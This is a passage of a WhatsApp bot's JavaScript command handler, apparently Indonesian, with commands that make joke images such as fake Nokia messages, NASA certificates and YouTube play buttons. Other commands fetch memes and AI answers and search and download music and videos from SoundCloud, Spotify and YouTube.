      ctx.textAlign = 'left'
      ctx.textBaseline = 'middle'

      while (fontSize > 25) {
        ctx.font = `bold ${fontSize}px Arial`

        const widest = Math.max(
          ...lines.map(v => ctx.measureText(v).width)
        )

        if (widest <= AREA_W) break

        fontSize -= 2
      }

      ctx.font = `bold ${fontSize}px Arial`

      const lineHeight = fontSize * 1.18

      const totalHeight =
        (lines.length - 1) * lineHeight

      const startY =
        AREA_Y +
        (AREA_H / 2) -
        (totalHeight / 2)

      lines.forEach((line, i) => {
        ctx.fillText(
          line,
          AREA_X,
          startY + (i * lineHeight)
        )
      })

      const buffer = canvas.toBuffer('image/jpeg')

      await client.sendMessage(
        m.chat,
        {
          image: buffer,
          caption: 'Fake Windows Media Player'
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e)
      reply('Gagal membuat gambar.')
    }
  }
  break

  case 'fakewindos': {
    try {
      if (!text) return xreply('Masukkan teks!');

      const { createCanvas, loadImage, registerFont } = require('canvas');
      const fs = require('fs');
      const path = require('path');
      const https = require('https');
      const http = require('http');

      const FONT_URL = 'https://raw.githubusercontent.com/skayhayato-cmyk/canvas/main/Arial%20Bold.ttf';
      const BG_URL = 'https://api.nexadev.my.id/uploder/uploads/OIqmKC.jpg';

      const FONT_PATH = path.join(__dirname, 'assets', 'ArialBold.ttf');
      const BG_PATH = path.join(__dirname, 'assets', 'bg.jpg');

      fs.mkdirSync(path.join(__dirname, 'assets'), { recursive: true });

      const downloadFile = (url, dest) => new Promise((resolve, reject) => {
        if (fs.existsSync(dest)) return resolve();

        const file = fs.createWriteStream(dest);
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
          if (res.statusCode !== 200) {
            fs.unlink(dest, () => { });
            return reject(new Error(`HTTP ${res.statusCode}`));
          }

          res.pipe(file);
          file.on('finish', () => file.close(resolve));
        }).on('error', (err) => {
          fs.unlink(dest, () => { });
          reject(err);
        });
      });

      await downloadFile(FONT_URL, FONT_PATH);
      await downloadFile(BG_URL, BG_PATH);

      registerFont(FONT_PATH, { family: 'ArialBold' });

      const lines = text.split('\n').map(v => v.trim()).filter(Boolean);

      const bg = await loadImage(BG_PATH);

      const W = bg.width;
      const H = bg.height;

      const canvas = createCanvas(W, H);
      const ctx = canvas.getContext('2d');

      ctx.drawImage(bg, 0, 0, W, H);

      const BOX_X = W * 0.003;
      const BOX_Y = H * 0.301;
      const BOX_W = W * 0.735;
      const BOX_H = H * 0.469;

      const DROP_PAD_TOP = BOX_H * 0.025;
      const DROP_PAD_BOTTOM = BOX_H * 0.15;

      const DROP_Y = BOX_Y + DROP_PAD_TOP;
      const DROP_H = BOX_H - DROP_PAD_TOP - DROP_PAD_BOTTOM;

      const TEXT_X = W * 0.118;
      const TEXT_MAX_W = BOX_W * 0.50;

      function wrapLine(ctx, text, maxWidth) {
        const words = text.split(' ');
        const wrapped = [];
        let current = '';

        for (const word of words) {
          const test = current ? current + ' ' + word : word;

          if (ctx.measureText(test).width > maxWidth && current) {
            wrapped.push(current);
            current = word;
          } else {
            current = test;
          }
        }

        if (current) wrapped.push(current);
        return wrapped.length ? wrapped : [text];
      }

      const FIXED_FONT = Math.floor(H * 0.11);
      const MIN_FONT = 10;

      let fontSize = FIXED_FONT;
      let wrappedLines = [];

      ctx.textBaseline = 'top';

      while (fontSize >= MIN_FONT) {
        ctx.font = `${fontSize}px ArialBold`;

        wrappedLines = lines.flatMap(l => wrapLine(ctx, l, TEXT_MAX_W));

        const lineH = fontSize * 1.30;
        const totalH = wrappedLines.length * lineH;

        if (totalH <= DROP_H) break;

        fontSize -= 2;
      }

      const lineHeight = fontSize * 1.30;

      const startY = DROP_Y + (DROP_H - (wrappedLines.length * lineHeight)) / 2;

      ctx.save();
      ctx.beginPath();
      ctx.rect(BOX_X, BOX_Y, BOX_W, BOX_H);
      ctx.clip();

      ctx.font = `${fontSize}px ArialBold`;
      ctx.fillStyle = '#111111';

      wrappedLines.forEach((line, i) => {
        const y = startY + (i * lineHeight);

        if (y > BOX_Y + BOX_H - lineHeight) return;

        ctx.fillText(line, TEXT_X, y);
      });

      ctx.restore();

      const buffer = canvas.toBuffer('image/jpeg', { quality: 0.95 });

      await client.sendMessage(m.chat, {
        image: buffer,
        caption: '🎵 Fake Windows Media Player 2 (Express Convert Case)'
      }, { quoted: m });

    } catch (e) {
      console.log(e);
      xreply('❌ Error fakewindos2');
    }
  }
  break;

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖭𝗈𝗄𝗂𝖺 2 ] ──────────── ///
  case 'fakenokia2': {
    if (!text) {
      return xreply(
        `Contoh penggunaan:\n\n${prefix + command} Halo dunia,MISTER-MD`
      )
    }

    let argsx = text.split(',')
    if (argsx.length < 2) {
      return xreply(
        `Format salah!\n\nContoh:\n${prefix + command} Halo dunia,MISTER-MD`
      )
    }

    let pesan = argsx[0].trim()
    let sender = argsx.slice(1).join(',').trim()

    try {
      let imageUrl = `https://api-xemoz-official.my.id/api/maker/nokiamsg.php?text=${encodeURIComponent(pesan)}&sender=${encodeURIComponent(sender)}`

      await client.sendMessage(
        m.chat,
        {
          image: { url: imageUrl },
          caption: `📱 *Fake Nokia Message*\n\n📝 Text: ${pesan}\n👤 Sender: ${sender}`
        },
        { quoted: m }
      )

    } catch (err) {
      console.error(err)
      xreply('Gagal membuat Fake Nokia Message!')
    }
  }
  break

  case 'fakenokia': {
    try {
      let [sender, pesan] = args.join(" ").split("|");

      if (!sender || !pesan) {
        return xreply(
          "❌ Format salah!\n\n" +
          "Cara pakai:\n" +
          ".fakemsg namapengirim|isipesan\n\n" +
          "Contoh:\n" +
          ".fakemsg Nanzz|Halo bro! apa kabar?"
        );
      }

      let url = `https://api-nanzz.my.id/docs/api/maker/nokia-msg.php` +
        `?sender=${encodeURIComponent(sender)}` +
        `&pesan=${encodeURIComponent(pesan)}`;

      let res = await axios.get(url, { responseType: "arraybuffer" });

      let buffer = Buffer.from(res.data);

      await client.sendMessage(m.chat, {
        image: buffer,
        caption: "✅ Nokia Message berhasil dibuat"
      }, { quoted: m });

    } catch (err) {
      console.log(err);
      xreply("❌ gagal membuat Nokia Message");
    }
  }
  break;

  /// ───────────── [ 𝖬𝖾𝗆𝖾 & 𝖠𝖨 𝖩𝖺𝗐𝖺𝖻𝖺𝗇 ] ──────────── ///
  case 'meme': {
    try {
      await xreply('⏳ Tunggu sebentar, sedang mengambil meme2 random...')

      const url = 'https://api.azbry.com/api/random/meme'

      const res = await fetch(url)

      if (!res.ok) throw 'API Error'

      const buffer = Buffer.from(await res.arrayBuffer())

      await client.sendMessage(m.chat, {
        image: buffer,
        caption: '🗿 Random Meme'
      }, {
        quoted: m
      })

    } catch (e) {
      console.log(e)
      xreply('Gagal mengambil meme')
    }
  }
  break

  case 'deepseek': {
    if (!text) return xreply(
      'Contoh:\n.deepseek siapa presiden Indonesia pertama'
    );

    try {
      const axios = require('axios');

      const { data } = await axios.get(
        `https://api.azbry.com/api/ai/deepseek?text=${encodeURIComponent(text)}`
      );

      if (!data.status || !data.result?.response) {
        return xreply('Gagal mengambil jawaban AI');
      }

      await client.sendMessage(
        m.chat,
        {
          text: `*AI DeepSeek*\n\n${data.result.response}`
        },
        { quoted: m }
      );

    } catch (err) {
      console.error(err);
      xreply('Terjadi kesalahan saat mengambil jawaban DeepSeek');
    }
  }
  break;

  case 'fakeustadz':
  case 'tanyaustadz': {
    try {
      if (!text) {
        return xreply(`Contoh:\n${prefix + command} apa hukum ganteng seperti noxXza, pak ustadz`)
      }

      const url = `https://api.azbry.com/api/maker/tanyaustadz?text=${encodeURIComponent(text)}`

      await client.sendMessage(
        m.chat,
        {
          image: { url },
          caption: `🕌 Tanya Ustadz\n\n📝 Pertanyaan: ${text}`
        },
        { quoted: m }
      )

    } catch (err) {
      console.error(err)
      xreply('Gagal membuat gambar Tanya Ustadz')
    }
  }
  break

  case 'fakenasa': {
    try {
      let nama = args.join(" ");

      if (!nama) {
        return xreply(
          "❌ Masukkan nama!\n\n" +
          "Cara pakai:\n" +
          ".fakenasa Nama Kamu\n\n" +
          "Contoh:\n" +
          ".fakenasa MISTER-MD"
        );
      }

      let url = `https://api-nanzz.my.id/docs/api/maker/sertifikat-nasa.php?nama=${encodeURIComponent(nama)}`;

      let res = await axios.get(url, { responseType: "arraybuffer" });

      let buffer = Buffer.from(res.data);

      await client.sendMessage(m.chat, {
        image: buffer,
        caption: `🎓 Sertifikat NASA berhasil dibuat\nNama: ${nama}`
      }, { quoted: m });

    } catch (err) {
      console.log(err);
      reply("❌ gagal membuat sertifikat NASA");
    }
  }
  break;

  case 'fakengl':
  case 'ngl': {
    if (!text) {
      return xreply(
        `📩 *Fake NGL Generator*\n\n` +
        `Contoh:\n${prefix + command} Gw tuh sebenarnya ultramen`
      );
    }

    try {
      await xreply('⏳ Tunggu sebentar, sedang membuat Fake NGL...');

      const apiUrl =
        `https://api-nanzz.my.id/docs/api/maker/fake-ngl.php?text=${encodeURIComponent(text)}`;

      const res = await fetch(apiUrl);

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}`);
      }

      const contentType = res.headers.get('content-type') || '';

      if (!contentType.includes('image')) {
        throw new Error('Response bukan gambar');
      }

      const buffer = Buffer.from(
        await res.arrayBuffer()
      );

      if (buffer.length < 1000) {
        throw new Error('Gambar kosong atau rusak');
      }

      await client.sendMessage(
        m.chat,
        {
          image: buffer,
          caption:
            `📩 *FAKE NGL BERHASIL*

📝 Pesan:
${text}

✅ Fake NGL berhasil dibuat.`
        },
        { quoted: m }
      );

    } catch (err) {
      console.error('FAKENGL ERROR:', err);

      xreply(
        `❌ Gagal membuat Fake NGL\n\n` +
        `${err.message || err}`
      );
    }
  }
  break;

  case 'fakeyt': {
    try {
      let [nama, template] = args.join(" ").split("|");

      if (!nama || !template) {
        return xreply(
          "❌ Format salah!\n\n" +
          "Cara pakai:\n" +
          ".fakeyt Nama|silver\n" +
          ".fakeyt Nama|gold\n\n" +
          "Contoh:\n" +
          ".fakeyt MISTER-MD|silver"
        );
      }

      let url = `https://api-nanzz.my.id/docs/api/maker/play-button.php` +
        `?nama=${encodeURIComponent(nama)}` +
        `&template=${encodeURIComponent(template)}`;

      let res = await axios.get(url, { responseType: "arraybuffer" });

      let buffer = Buffer.from(res.data);

      await client.sendMessage(m.chat, {
        image: buffer,
        caption: `🎬 YouTube Play Button berhasil dibuat\nNama: ${nama}\nTemplate: ${template}`
      }, { quoted: m });

    } catch (err) {
      console.log(err);
      xreply("❌ gagal membuat Play Button");
    }
  }
  break;

  /// ───────────── [ 𝖨𝖣 𝖢𝖺𝗋𝖽 & 𝖥𝖺𝗄𝖾 𝖬𝖫 ] ──────────── ///
  case "idcard": {
    if (!text) {
      return xreply(
        `Example :\n${prefix + command} MISTER-MD|creator|md|https://t.me/MISTER-MD`
      )
    }

    let [name, title, script, telegram] = text.split("|")

    if (!name || !title || !script || !telegram) {
      return xreply(
        `Format salah!\n\n${prefix + command} name|title|script|telegram`
      )
    }

    const {
      createCanvas,
      loadImage
    } = require("canvas")

    const template =
      "https://img2.pixhost.to/images/8206/731465960_lanz-1779881748979.jpg"

    const bg = await loadImage(template)

    const canvas = createCanvas(
      bg.width,
      bg.height
    )

    const ctx = canvas.getContext("2d")

    ctx.drawImage(
      bg,
      0,
      0,
      canvas.width,
      canvas.height
    )

    ctx.textBaseline = "top"

    ctx.font = "30px monospace"

    ctx.fillStyle = "#ffffff"

    ctx.fillText(
      `${name}.json`,
      255,
      488
    )
    ctx.font = "27px monospace"
    ctx.fillStyle = "#ffffff"

    ctx.fillText(
      "{",
      190,
      580
    )

    ctx.fillStyle = "#8A9A5B"

    ctx.fillText(
      `"name"`,
      250,
      630
    )

    ctx.fillStyle = "#00b7ff"

    ctx.fillText(
      `: "${name}",`,
      340,
      630
    )

    ctx.fillStyle = "#8A9A5B"

    ctx.fillText(
      `"title"`,
      250,
      680
    )

    ctx.fillStyle = "#00b7ff"

    ctx.fillText(
      `: "${title}",`,
      365,
      680
    )

    ctx.fillStyle = "#8A9A5B"

    ctx.fillText(
      `"script"`,
      250,
      735
    )

    ctx.fillStyle = "#00b7ff"

    ctx.fillText(
      `: "${script}",`,
      378,
      735
    )

    ctx.fillStyle = "#8A9A5B"

    ctx.fillText(
      `"telegram"`,
      250,
      790
    )

    ctx.fillStyle = "#00b7ff"

    ctx.fillText(
      `: "${telegram}"`,
      409,
      790
    )

    ctx.fillStyle = "#FFFFFF"

    ctx.fillText(
      "}",
      190,
      850
    )

    const hasil = canvas.toBuffer()

    await client.sendMessage(
      m.chat,
      {
        image: hasil,
        caption: "Success create id card"
      },
      {
        quoted: m
      }
    )

  }
  break

  case "fakeml": {
    try {
      if (!text) {
        return xreply(
          `❌ Nickname belum diisi

Contoh:
${prefix}fakelobyml MISTER-MD`
        )
      }

      if (!/image/.test(mime)) {
        return xreply(
          `❌ Reply/kirim foto terlebih dahulu

Contoh:
1. Reply foto
2. Ketik:
${prefix}fakelobyml MISTER-MD`
        )
      }

      const nickname = text.trim()

      if (nickname.length > 30) {
        return xreply('❌ Nickname maksimal 30 karakter')
      }

      await xreply('⏳ Mengupload avatar...')

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      if (!media || !fs.existsSync(media)) {
        return xreply('❌ Gagal mengambil foto')
      }

      const { ImageUploadService } = require('node-upload-images')

      const service = new ImageUploadService('pixhost.to')

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        'rafaofficial.png'
      )

      await fs.unlinkSync(media)

      if (!directLink) {
        return xreply('❌ Gagal mendapatkan URL Pixhost')
      }

      const avatar = directLink.toString()

      await xreply('⏳ Sedang membuat Fake Lobby ML...')

      const apiUrl =
        `https://api.nexray.eu.cc/maker/fakelobyml?avatar=${encodeURIComponent(avatar)}&nickname=${encodeURIComponent(nickname)}`

      const response = await axios.get(apiUrl, {
        responseType: 'arraybuffer',
        timeout: 120000,
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'image/*'
        },
        maxContentLength: 20 * 1024 * 1024,
        maxBodyLength: 20 * 1024 * 1024
      })

      if (!response.data || !response.data.length) {
        return xreply(
          '❌ API tidak mengembalikan hasil gambar'
        )
      }

      const contentType =
        response.headers['content-type'] || ''

      if (!contentType.includes('image')) {
        let errorText = ''

        try {
          errorText = Buffer
            .from(response.data)
            .toString('utf8')
        } catch {
          errorText = 'Response API bukan gambar'
        }

        return xreply(
          `❌ *FAKE LOBBY ML GAGAL*

${errorText.substring(0, 1000)}`
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption:
            `
👤 Nickname:
${nickname}
✨ Fake Lobby ML berhasil dibuat`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log('FAKELOBYML ERROR:', e)

      let errorMessage =
        e.response?.data?.message ||
        e.response?.data?.msg ||
        e.message ||
        'Terjadi kesalahan tidak diketahui'

      if (
        e.code === 'ECONNABORTED' ||
        e.code === 'ETIMEDOUT'
      ) {
        errorMessage =
          'Request API timeout. Silakan coba lagi.'
      }

      if (e.response?.status === 404) {
        errorMessage =
          'Endpoint Fake Lobby ML tidak ditemukan'
      }

      if (e.response?.status === 429) {
        errorMessage =
          'Terlalu banyak request. Silakan tunggu beberapa saat.'
      }

      return xreply(
        `❌ *FAKE LOBBY ML ERROR*

${errorMessage}`
      )
    }
  }
  break

  case 'fakeml2': {
    await m.react('✨')

    let q = m.quoted
    if (!q) {
      return client.sendMessage(
        m.chat,
        { text: 'ℹ️ Cara pakai:\nReply gambar lalu ketik *.fakeml teksnya*' },
        { quoted: global.fkontak }
      )
    }

    let mime = (q.msg || q).mimetype || ''
    if (!mime.startsWith('image/')) {
      return client.sendMessage(
        m.chat,
        { text: 'ℹ️ Cara pakai:\nReply gambar lalu ketik *.fakeml teksnya*' },
        { quoted: m }
      )
    }

    let buffer = await q.download().catch(() => null)
    if (!buffer) return

    let ext = mime.split('/')[1] || 'jpg'
    let tempFile = path.join(process.cwd(), `fakeml_${Date.now()}.${ext}`)
    fs.writeFileSync(tempFile, buffer)

    try {
      const uguuRes = await UploadFileUgu(tempFile)
      let avatarUrl = typeof uguuRes === 'string' ? uguuRes : (uguuRes?.url || uguuRes?.result?.url || uguuRes?.files?.[0]?.url)

      let apiUrl = `${global.APIs.deline}/maker/fakeml?text=${encodeURIComponent(text)}&avatar=${encodeURIComponent(avatarUrl)}`
      let res = await fetch(apiUrl)
      if (!res.ok) throw 'API error'

      let resultBuffer = await res.buffer()

      await client.sendMessage(
        m.chat,
        {
          image: resultBuffer,
          caption: '✨ Fake ML Chat'
        },
        { quoted: global.fkontak }
      )

    } catch (e) {
      console.error(e)
      await client.sendMessage(
        m.chat,
        { text: '❌ Gagal memproses gambar' },
        { quoted: global.fkontak }
      )
    } finally {
      if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile)
    }
  }
  break

  /// ───────────── [ 𝖲𝗈𝗎𝗇𝖽𝖢𝗅𝗈𝗎𝖽 & 𝖲𝗉𝗈𝗍𝗂𝖿𝗒 ] ──────────── ///
  case 'playclound':
  case 'scsearch': {
    if (!text) return xreply(`Example: ${prefix + command} DJ Tiktok`);

    try {
      const axios = require('axios')

      let api = `https://api.soonex.biz.id/v1/search/soundcloud?q=${encodeURIComponent(text)}`

      let { data } = await axios.get(api)

      console.log(data)

      if (!data.status) {
        return xreply(`*Lagu tidak ditemukan!* ☹️`)
      }

      let result = data.result[0]

      if (!result) {
        return xreply(`*Lagu tidak ditemukan!* ☹️`)
      }

      let caption = `「 *SOUNDCLOUD SEARCH* 」\n\n`
      caption += `🎵 Title : ${result.title}\n`
      caption += `▶️ Plays : ${result.plays}\n`
      caption += `❤️ Likes : ${result.likes}\n`
      caption += `🔗 URL : ${result.url}\n`

      await client.sendMessage(m.chat, {
        image: { url: result.artwork },
        caption: caption,
        footer: `${global.namaOwner}`,
        buttons: [
          {
            buttonId: `${prefix}scdl ${result.url}`,
            buttonText: { displayText: "🎵 Download Audio" },
            type: 1
          }
        ],
        headerType: 1
      }, { quoted: m })

    } catch (err) {
      console.log(err)
      xreply(`❌ Error search SoundCloud`)
    }
  }
  break

  case 'soundcloud':
  case 'scdl': {
    if (!text) {
      return xreply(`Contoh:\n.scdl https://soundcloud.com/xxxx/xxxx`)
    }

    try {
      const axios = require('axios')

      await client.sendMessage(m.chat, {
        react: {
          text: '🎵',
          key: m.key
        }
      })

      let api = `https://api.azbry.com/api/download/soundcloud?url=${encodeURIComponent(text)}`

      let { data } = await axios.get(api)

      console.log(data)

      if (!data.status) {
        return xreply('❌ Gagal mengambil audio')
      }

      let result = data.result

      await client.sendMessage(
        m.chat,
        {
          audio: {
            url: result.download
          },
          mimetype: 'audio/mpeg',
          fileName: `${result.title}.mp3`,
          ptt: false
        },
        {
          quoted: m
        }
      )

    } catch (err) {
      console.log(err)
      xreply('❌ Terjadi kesalahan saat download SoundCloud')
    }
  }
  break

  case "playsf": {
    try {
      if (!text) {
        return reply(`Contoh penggunaan:\n${prefix + command} sesi potret`);
      }

      Reply("⏳ Sedang mencari lagu di Spotify...");

      const axios = require("axios");

      const api = `https://api.nexray.eu.cc/downloader/spotifyplay?q=${encodeURIComponent(text)}`;

      const { data } = await axios.get(api);

      if (!data.status || !data.result) {
        return reply("❌ Lagu tidak ditemukan.");
      }

      let res = data.result;

      let caption = `*🎵 SPOTIFY PLAY*

*📀 Judul :* ${res.title}
*🎤 Artist :* ${res.artist}
*💽 Album :* ${res.album}
*⏱ Durasi :* ${res.duration}
*⭐ Popularity :* ${res.popularity}
*📅 Release :* ${res.release_at}

*🔗 Spotify :*
${res.url}

⏳ Mengirim audio...`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: res.thumbnail },
          caption
        },
        { quoted: m }
      );

      await client.sendMessage(
        m.chat,
        {
          audio: { url: res.download_url },
          mimetype: "audio/mpeg",
          fileName: `${res.title}.mp3`,
          ptt: false
        },
        { quoted: m }
      );

    } catch (e) {
      console.log(e);
      Reply("❌ Terjadi kesalahan saat mengambil lagu Spotify.");
    }
  }
  break;

  /// ───────────── [ 𝖸𝗈𝗎𝖳𝗎𝖻𝖾 𝖯𝗅𝖺𝗒 ] ──────────── ///
  case 'play': {
    if (!text) return xreply(`Example: ${prefix + command} Lagu sad`);
    
    try {
      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

      const { data } = await axios.get(
        `https://api.ikyyxd.my.id/search/ytplay?q=${encodeURIComponent(text)}`,
        { timeout: 60000 }
      );

      if (!data.status || !data.result || !data.result.audio?.url) {
        await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        return xreply(`*Lagu tidak ditemukan!* ☹️`);
      }

      const res = data.result;
      const minutes = Math.floor(res.duration / 60);
      const seconds = res.duration % 60;
      const durationText = `${minutes}:${seconds.toString().padStart(2, '0')}`;

      const caption = `「 *YOUTUBE PLAY* 」
└╼ Title : ${res.title}
└╼ Duration : ${durationText}
└╼ URL Video : ${res.source}`;

      await client.sendMessage(m.chat, {
        image: { url: res.thumbnail },
        caption: caption,
        contextInfo: {
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: global.namaSaluran
          }
        }
      }, { quoted: m });

      await client.sendMessage(m.chat, {
        audio: { url: res.audio.url },
        mimetype: 'audio/mpeg',
        fileName: `${res.title}.mp3`,
        ptt: false
      }, { quoted: m });

      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
      console.error(err);
      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
      xreply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
    }
  }
  break
  
  case 'play-v2':
  case 'playv2': {
    if (!text) return xreply(`Example: ${prefix + command} Lagu sad`);
    
    try {
      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

      const { data } = await axios.get(
        `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(text)}`,
        { timeout: 60000 }
      );

      if (!data.status || !data.result || !data.result.audio?.url) {
        await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        return xreply(`*Lagu tidak ditemukan!* ☹️`);
      }

      const res = data.result;
      const minutes = Math.floor(res.duration / 60);
      const seconds = res.duration % 60;
      const durationText = `${minutes}:${seconds.toString().padStart(2, '0')}`;

      const caption = `「 *YOUTUBE PLAY V2* 」
└╼ Title : ${res.title}
└╼ Duration : ${durationText}
└╼ URL Video : ${res.source}`;

      await client.sendMessage(m.chat, {
        image: { url: res.thumbnail },
        caption: caption,
        contextInfo: {
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: global.namaSaluran
          }
        }
      }, { quoted: m });

      await client.sendMessage(m.chat, {
        audio: { url: res.audio.url },
        mimetype: 'audio/mpeg',
        fileName: `${res.title}.mp3`,
        ptt: false
      }, { quoted: m });

      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
      console.error(err);
      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
      xreply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
    }
  }
  break
  
case 'ytsearch':
case 'yts': {
  if (!text) return xreply(`Example: ${prefix + command} Epep`);

  try {
    await client.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });
    await xreply(`⏳ Mencari *${text}* di YouTube...`);

    const { data } = await axios.get(
      `https://api.ikyyxd.my.id/search/youtube?apikey=kyzz&query=${encodeURIComponent(text)}`,
      { timeout: 60000 }
    );

    if (!data.status || !data.result || !Array.isArray(data.result) || data.result.length === 0) {
      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
      return xreply(`❌ Video tidak ditemukan untuk: *${text}*`);
    }

    const results = data.result.slice(0, 10);
    const cards = [];

    for (const item of results) {
      try {
        const media = await prepareWAMessageMedia(
          { image: { url: item.imageUrl } },
          { upload: client.waUploadToServer }
        );

        cards.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            hasMediaAttachment: true,
            ...media
          }),
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: `*${item.title}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: `📺 ${item.channel}\n⏱️ ${item.duration}`
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": JSON.stringify({
                  display_text: "Tonton Video",
                  url: item.link,
                  merchant_url: "https://www.google.com"
                })
              }
            ]
          })
        });

      } catch (err) {
        console.error(`Gagal memproses card untuk ${item.title}:`, err.message);
        continue;
      }
    }

    if (cards.length === 0) {
      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
      return xreply("❌ Gagal memuat gambar dari hasil pencarian.");
    }

    const msgii = await generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: `🔎 *HASIL PENCARIAN YOUTUBE*`
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: cards
            })
          })
        }
      }
    }, { userJid: m.sender, quoted: m });

    let additionalNodes = [
      {
        tag: "biz",
        attrs: {},
        content: [
          {
            tag: "interactive",
            attrs: { type: "native_flow", v: "1" },
            content: [
              { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
            ]
          }
        ]
      }
    ]

    if (!m.chat.endsWith("@g.us")) {
      additionalNodes.push({
        tag: "bot",
        attrs: { biz_bot: "1" },
        content: []
      })
    }

    await client.relayMessage(m.chat, msgii.message, {
      messageId: msgii.key.id,
      additionalNodes: additionalNodes
    });

    await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (err) {
    console.error('[YTSEARCH ERROR]', err);
    await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    xreply(`❌ *Terjadi kesalahan!*\n\n${err.message || err}`);
  }
}
break

  /// ───────────── [ 𝖸𝖳𝖬𝖯3 & 𝖸𝖳𝖬𝖯4 ] ──────────── ///
  case 'ytmp3': {
    try {
      if (!text) return xreply(example('https://youtube.com/watch?v=...'))
      if (!text.includes('youtu')) return xreply('⚠️ Masukan Link YouTube\n\n.ytmp3 <link>')

      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

      const { data: json } = await axios.get(
        `http://api.ikyyxd.my.id/download/ytmp3?url=${encodeURIComponent(text)}`,
        { timeout: 120000 }
      )

      console.log('[YTMP3 RESPONSE]', JSON.stringify(json, null, 2))

      const isOk =
        json?.status === true ||
        json?.status === 200 ||
        json?.status === 'success' ||
        json?.success === true ||
        json?.result ||
        json?.data

      if (!isOk) {
        return xreply(
          `❌ *Gagal ambil audio*\n\n${json?.message || json?.error || json?.msg || 'API tidak merespon dengan benar.'}`
        )
      }

      const data = json.result || json.data || json
      const downloadUrl =
        data.download ||
        data.url ||
        data.dl ||
        data.link ||
        data.mp3 ||
        data.audio ||
        (Array.isArray(data.medias) && (data.medias.find(v => /audio|mp3/i.test(v.type || v.quality || ''))?.url)) ||
        null

      const title =
        data.title ||
        data.name ||
        data.judul ||
        'YouTube Audio'

      const duration = data.duration || data.length || data.durasi || '-'

      if (!downloadUrl) {
        return xreply(
          `❌ Download URL tidak ditemukan di response.\n\n` +
          `Response API:\n\`\`\`\n${JSON.stringify(json).slice(0, 1500)}\n\`\`\``
        )
      }

      const { data: buffer } = await axios.get(downloadUrl, {
        responseType: 'arraybuffer',
        timeout: 300000,
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      })

      const audioBuffer = Buffer.from(buffer)
      if (!audioBuffer.length) throw new Error('File audio kosong.')

      const safeTitle = (title.replace(/[^\w\s-]/gi, '_').trim() || 'audio').slice(0, 80)
      const sizeMB = (audioBuffer.length / 1024 / 1024).toFixed(2)

      const caption =
        `🎵 *${title}*\n` +
        `⏱ Duration : ${duration}\n` +
        `📦 Size : ${sizeMB} MB\n\n` +
        `> ${global.botname || 'MISTER-MD'}`

      if (audioBuffer.length > 1024 * 1024 * 100) {
        await client.sendMessage(m.chat, {
          document: audioBuffer,
          mimetype: 'audio/mpeg',
          fileName: `${safeTitle}.mp3`,
          caption
        }, { quoted: m })
      } else {
        await client.sendMessage(m.chat, {
          audio: audioBuffer,
          mimetype: 'audio/mpeg',
          fileName: `${safeTitle}.mp3`,
          ptt: false
        }, { quoted: m })
        await xreply(caption)
      }

      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
    } catch (e) {
      console.error('[YTMP3 ERROR]', e?.response?.data || e?.message || e)
      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => { })
      return xreply(`❌ *Error*\n\n${e?.response?.data?.message || e?.response?.data?.error || e?.message || e}`)
    }
  }
  break

  case 'ytmp4': {
    try {
      if (!text) return xreply(example('https://youtube.com/watch?v=... | 720'))

      let link = text
      let format = '720'
      if (text.includes('|')) {
        const parts = text.split('|').map(v => v.trim())
        link = parts[0]
        format = parts[1] || '720'
      }

      if (!link.includes('youtu')) return xreply('⚠️ Masukan Link YouTube\n\n.ytmp4 <link>|<format>\nFormat: 144, 240, 360, 720, 1080')

      const formats = ['144', '240', '360', '720', '1080']
      if (!formats.includes(format)) return xreply(`⚠️ Format tersedia: ${formats.join(', ')}`)

      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

      const { data: json } = await axios.get(
        `http://api.ikyyxd.my.id/download/ytmp4?url=${encodeURIComponent(link)}&quality=${format}`,
        { timeout: 120000 }
      )

      console.log('[YTMP4 RESPONSE]', JSON.stringify(json, null, 2))

      const isOk =
        json?.status === true ||
        json?.status === 200 ||
